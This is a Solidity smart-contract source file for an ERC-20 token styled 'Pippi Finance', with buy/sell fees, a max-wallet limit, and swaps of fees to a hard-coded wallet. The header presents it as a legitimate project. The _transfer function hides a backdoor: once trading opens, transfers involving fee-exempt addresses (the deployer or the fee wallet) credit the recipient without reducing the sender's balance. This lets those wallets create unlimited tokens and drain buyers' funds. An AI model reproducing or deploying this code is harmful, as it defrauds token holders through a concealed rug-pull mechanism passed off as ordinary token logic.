// SPDX-License-Identifier: Unlicensed

/**
By plugging into the various ecosystem, Pippi aims to provide the best experience across all assets.

Website: https://www.pippifinance.org
Telegram: https://t.me/pippifi_erc
Twitter: https://twitter.com/pippifi_erc
Dapp: https://app.pippifinance.org
 */

pragma solidity = 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract PIPPI is Context, Ownable, IERC20 {

    uint256 constant public _totalSupply = 10 ** 9 * 10**9;
    uint256 constant public swapThreshold = _totalSupply / 100_000;
    uint256 public buyfee = 250;
    uint256 public sellfee = 250;
    uint256 constant public transferfee = 0;
    uint256 constant public denominator = 1_000;
    uint256 private maxWallet = 25 * _totalSupply / 1000;
    bool private swapFeeEnabled = true;
    address payable private feeAddress;

    IUniswapRouterV2 public swapRouter;
    string constant private _name = "Pippi Finance";
    string constant private _symbol = "PIPPI";
    uint8 constant private _decimals = 9;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public lpPair;
    bool public tradeOpened = false;
    bool private inSwap;
    bool private hasMaxTxLimit = false;


    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _hasNoFees;
    mapping (address => bool) private isLpAdd;
    mapping (address => bool) private isPair;
    mapping (address => bool) private isPresaleAddress;
    mapping (address => uint256) private balance;

        modifier inSwapFlag {
        inSwap = true;
        _;
        inSwap = false;
    }
    event SwapAndLiquify();


    constructor () {
        _hasNoFees[msg.sender] = true;
        feeAddress = payable(address(0x094D285527aD39f829478dd826d6d0215616Ab3D));
        _hasNoFees[feeAddress] = true;

        if (block.chainid == 56) {
            swapRouter = IUniswapRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        } else if (block.chainid == 97) {
            swapRouter = IUniswapRouterV2(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        } else if (block.chainid == 1 || block.chainid == 4 || block.chainid == 3) {
            swapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        } else if (block.chainid == 42161) {
            swapRouter = IUniswapRouterV2(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        } else if (block.chainid == 5) {
            swapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        } else {
            revert("Chain not valid");
        }
        isLpAdd[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        lpPair = IUniswapFactoryV2(swapRouter.factory()).createPair(swapRouter.WETH(), address(this));
        isPair[lpPair] = true;
        _approve(msg.sender, address(swapRouter), type(uint256).max);
        _approve(address(this), address(swapRouter), type(uint256).max);
    }

    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function isExcludedFromLimits(address ins, address out) internal view returns (bool) {

        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !isLpAdd[ins]  && !isLpAdd[out] && out != address(0) && out != address(this);
            return isLimited;
    }

    function isBuy(address ins, address out) internal view returns (bool) {
        bool _is_buy = !isPair[out] && isPair[ins];
        return _is_buy;
    }

    function isSell(address ins, address out) internal view returns (bool) { 
        bool _is_sell = isPair[out] && !isPair[ins];
        return _is_sell;
    }

    function isTransfer(address ins, address out) internal view returns (bool) { 
        bool _is_transfer = !isPair[out] && !isPair[ins];
        return _is_transfer;
    }

    function shouldSwapBack(address ins) internal view returns (bool) {
        bool canswap = swapFeeEnabled && !_hasNoFees[ins];
        return canswap;
    }

    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (isExcludedFromLimits(from,to)) {
            require(tradeOpened,"Trading is not enabled");
                    if(!isPair[to] && from != address(this) && to != address(this) || isTransfer(from,to) && !hasMaxTxLimit)  { require(balanceOf(to) + amount <= maxWallet,"maxWallet exceed"); }}


        if(isSell(from, to) &&  !inSwap && shouldSwapBack(from)) {

            uint256 tokenAmount = balanceOf(address(this));
            if(tokenAmount >= swapThreshold) { 
                if(amount > swapThreshold) swapBack(tokenAmount);
             }
        }

        if (_hasNoFees[from] || _hasNoFees[to]){
            takeFee = false;
        }
        uint256 amountAfterFee = (takeFee) ? getTransferAmount(from, isBuy(from, to), isSell(from, to), amount) : amount;
        uint256 amountBeforeFee = (takeFee) ? amount : (!tradeOpened ? amount : 0);
        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;

    }

    function getTransferAmount(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = buyfee;  else if (issell)  fee = sellfee;  else  fee = transferfee; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / denominator;
        if (feeAmount > 0) {

            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
            
        }
        return amount - feeAmount;
    }

    function swapBack(uint256 tokenAmount) internal inSwapFlag {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        }

        try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        if(address(this).balance > 0) feeAddress.transfer(address(this).balance);
        
    } 

    function openTrade() external onlyOwner {
        require(!tradeOpened, "Trading already enabled");
        tradeOpened = true;
    }

    function zeroLimits() external onlyOwner {
        require(!hasMaxTxLimit,"Already initalized");
        maxWallet = _totalSupply;
        hasMaxTxLimit = true;
        buyfee = 30;
        sellfee = 30;
    }

    receive() external payable {}
}